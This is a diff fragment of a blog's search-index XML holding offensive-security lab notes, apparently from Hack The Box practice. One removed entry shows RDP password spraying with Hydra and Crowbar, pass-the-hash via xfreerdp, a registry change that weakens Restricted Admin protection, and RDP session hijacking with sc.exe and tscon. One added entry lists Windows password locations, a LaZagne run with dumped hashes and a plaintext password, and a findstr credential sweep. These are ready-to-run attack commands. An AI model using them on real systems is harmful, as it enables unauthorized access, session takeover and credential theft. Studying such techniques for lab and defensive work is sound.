-    <content><![CDATA[<h1 id="Password-Spray"><a href="#Password-Spray" class="headerlink" title="Password Spray"></a>Password Spray</h1><h4 id="Hydra"><a href="#Hydra" class="headerlink" title="Hydra"></a>Hydra</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">hydra -L usernames.txt -p <span class="string">&#x27;Pwd&#x27;</span> ip rdp</span><br></pre></td></tr></table></figure>
-
-<h4 id="Crowbar"><a href="#Crowbar" class="headerlink" title="Crowbar"></a>Crowbar</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">crowbar -b rdp -s ip/32 -U usernames.txt -c &#x27;Pwd&#x27;</span><br></pre></td></tr></table></figure>
-
-
-<h1 id="Pass-The-Hash-ptt"><a href="#Pass-The-Hash-ptt" class="headerlink" title="Pass The Hash ( ptt )"></a>Pass The Hash ( ptt )</h1><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">xfreerdp /v:ip /u:username /pth:<span class="built_in">hash</span></span><br></pre></td></tr></table></figure>
-
-
-<blockquote>
-<p>Sometimes we may be blocked because Restricted Admin Mode is disabled by default, so we can enable it using PowerShell and then try PtH again:</p>
-</blockquote>
-<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">C:\htb&gt; reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d <span class="number">0</span>x0 /f</span><br></pre></td></tr></table></figure>
-
-
-<h1 id="RDP-Session-Hijacking"><a href="#RDP-Session-Hijacking" class="headerlink" title="RDP Session Hijacking"></a>RDP Session Hijacking</h1><blockquote>
-<p>If we get <code>SYSTEM privileges</code> on the target machine, we can hijack an active RDP session, potentially taking over a Domain Admin account.</p>
-</blockquote>
-<p>List active RDP sessions</p>
-<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">C:\htb&gt; query user</span><br><span class="line"></span><br><span class="line"> USERNAME              SESSIONNAME        ID  STATE   IDLE TIME  LOGON TIME</span><br><span class="line">&gt;twistzz               rdp<span class="literal">-tcp</span><span class="comment">#13          1  Active          7  8/25/2021 1:23 AM</span></span><br><span class="line"> test                  rdp<span class="literal">-tcp</span><span class="comment">#14          2  Active          *  8/25/2021 1:28 AM</span></span><br></pre></td></tr></table></figure>
-
-<p>Creating a new service with <code>sc.exe</code> and attaching ourselves to another user session using <code>tscon</code></p>
-<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">C:\htb&gt; sc.exe create service<span class="literal">-name</span> binpath= <span class="string">&quot;cmd.exe /k tscon TARGET_SESSION_ID /dest: OUR_SESSION_NAME &quot;</span></span><br><span class="line"></span><br><span class="line">[<span class="type">SC</span>] CreateService SUCCESS</span><br></pre></td></tr></table></figure>
-
-<p>Start the service to hijack the session</p>
-<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">C:\htb&gt; net <span class="built_in">start</span> service<span class="literal">-name</span></span><br></pre></td></tr></table></figure>
-
-
-]]></content>
-      <categories>
-        <category>Active Directory</category>
-        <category>Service-Exploitation</category>
-        <category>RDP</category>
-      </categories>
-      <tags>
-        <tag>RDP</tag>
-        <tag>RDP-Session-Hijacking</tag>
-        <tag>Crowbar</tag>
-        <tag>Hydra</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>Writing Custom Wordlists and Rules</title>
     <url>/2025/12/04/Writing-Custom-Wordlists-and-Rules/</url>
     <content><![CDATA[<h1 id="Default-Credential"><a href="#Default-Credential" class="headerlink" title="Default Credential"></a>Default Credential</h1><h3 id="Creds"><a href="#Creds" class="headerlink" title="Creds"></a>Creds</h3><p>Installation </p>
@@ -1472,6 +1507,54 @@
         <tag>CeWL</tag>
         <tag>Cupp</tag>
         <tag>Hashcat Rules</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Windows Credential Hunting</title>
+    <url>/2025/11/26/Windows-Credential-Hunting/</url>
+    <content><![CDATA[<h2 id="Common-Password-Location"><a href="#Common-Password-Location" class="headerlink" title="Common Password Location"></a>Common Password Location</h2><ul>
+<li><code>C:\Users\ALA\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt</code></li>
+<li><code>Passwords in Group Policy in the SYSVOL share</code></li>
+<li><code>Passwords in scripts in the SYSVOL share</code></li>
+<li><code>Password in scripts on IT shares</code></li>
+<li><code>Passwords in web.config files on dev machines and IT shares</code></li>
+<li><code>Password in unattend.xml</code></li>
+<li><code>Passwords in the AD user or computer description fields</code></li>
+<li><code>KeePass databases (if we are able to guess or crack the master password)</code></li>
+<li><code>Found on user systems and shares</code></li>
+<li><code>Files with names like pass.txt, passwords.docx, passwords.xlsx found on user systems, shares, and Sharepoint</code></li>
+</ul>
+<h2 id="LaZagne"><a href="#LaZagne" class="headerlink" title="LaZagne"></a>LaZagne</h2><p>Normal User Access : </p>
+<ul>
+<li><code>Browser passwords (Chrome / Edge / Firefox)</code></li>
+<li><code>Application credentials</code></li>
+<li><code>Wifi passwords</code></li>
+<li><code>Chat app passwords</code></li>
+<li><code>Mail client passwords</code></li>
+<li><code>Windows Credential Manager secrets (current user only)</code></li>
+</ul>
+<p>Administrator Access :</p>
+<ul>
+<li><code>LSASS</code></li>
+<li><code>LSA</code></li>
+<li><code>KeePass memory extraction</code></li>
+</ul>
+<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line"><span class="function">C:\<span class="title">Users</span>\<span class="title">bob</span>\<span class="title">Desktop</span>&gt; <span class="title">start</span> <span class="title">LaZagne.exe</span> <span class="title">all</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="title">Administrator</span>:500:<span class="title">aad3b435b51404eeaad3b435b51404ee</span>:31<span class="title">d6cfe0d16ae931b73c59d7e0c089c0</span>:::</span></span><br><span class="line"><span class="function"><span class="title">Guest</span>:501:<span class="title">aad3b435b51404eeaad3b435b51404ee</span>:31<span class="title">d6cfe0d16ae931b73c59d7e0c089c0</span>:::</span></span><br><span class="line"><span class="function"><span class="title">DefaultAccount</span>:503:<span class="title">aad3b435b51404eeaad3b435b51404ee</span>:31<span class="title">d6cfe0d16ae931b73c59d7e0c089c0</span>:::</span></span><br><span class="line"><span class="function"><span class="title">WDAGUtilityAccount</span>:504:<span class="title">aad3b435b51404eeaad3b435b51404ee</span>:72639<span class="title">bbb94990305b5a015220f8de34e</span>:::</span></span><br><span class="line"><span class="function"><span class="title">bob</span>:1001:<span class="title">aad3b435b51404eeaad3b435b51404ee</span>:3<span class="title">c0e5d303ec84884ad5c3b7876a06ea6</span>:::</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">########## <span class="title">User</span>: <span class="title">bob</span> ##########</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">------------------- <span class="title">Winscp</span> <span class="title">passwords</span> -----------------</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">[+] <span class="title">Password</span> <span class="title">found</span> !!!</span></span><br><span class="line"><span class="function"><span class="title">URL</span>: 10.129.202.64</span></span><br><span class="line"><span class="function"><span class="title">Login</span>: <span class="title">ubuntu</span></span></span><br><span class="line"><span class="function"><span class="title">Password</span>: <span class="title">FSadmin123</span></span></span><br><span class="line"><span class="function"><span class="title">Port</span>: 22</span></span><br></pre></td></tr></table></figure>
+
+
+<h2 id="Search-for-File-Content-findstr"><a href="#Search-for-File-Content-findstr" class="headerlink" title="Search for File Content - findstr"></a>Search for File Content - findstr</h2><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">findstr /SIM /C:<span class="string">&quot;password&quot;</span> /C:<span class="string">&quot;passphrase&quot;</span> /C:<span class="string">&quot;key&quot;</span> /C:<span class="string">&quot;username&quot;</span> /C:<span class="string">&quot;user account&quot;</span> /C:<span class="string">&quot;creds&quot;</span> /C:<span class="string">&quot;users&quot;</span> /C:<span class="string">&quot;passkeys&quot;</span> /C:<span class="string">&quot;configuration&quot;</span> /C:<span class="string">&quot;dbcredential&quot;</span> /C:<span class="string">&quot;dbpassword&quot;</span> /C:<span class="string">&quot;pwd&quot;</span> /C:<span class="string">&quot;login&quot;</span> /C:<span class="string">&quot;credentials&quot;</span> *.txt *.ini *.cfg *.config *.xml *.git *.ps1 *.yml</span><br></pre></td></tr></table></figure>
+
+
+]]></content>
+      <categories>
+        <category>Active Directory</category>
+        <category>Windows</category>
+        <category>Post-Exploitation</category>
+        <category>Credential Hunting</category>
+      </categories>
+      <tags>
+        <tag>Lazagne</tag>
+        <tag>Search-for-File-Content</tag>
       </tags>
   </entry>
 </search>
